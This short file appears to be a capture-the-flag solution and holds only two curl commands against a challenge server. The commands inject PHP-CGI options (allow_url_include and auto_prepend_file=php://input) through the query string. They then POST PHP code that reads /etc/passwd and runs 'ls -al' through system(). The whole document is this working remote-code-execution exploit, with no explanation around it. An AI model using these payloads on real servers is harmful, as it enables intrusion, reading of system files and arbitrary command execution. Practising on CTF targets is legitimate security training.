curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include=On+-d+auto_prepend_file=php://input" -H text/plain -X POST -d "<?php readfile('/etc/passwd'); ?>"

curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include=On+-d+auto_prepend_file=php://input" -X POST -d "<?php system('ls -al'); ?>"

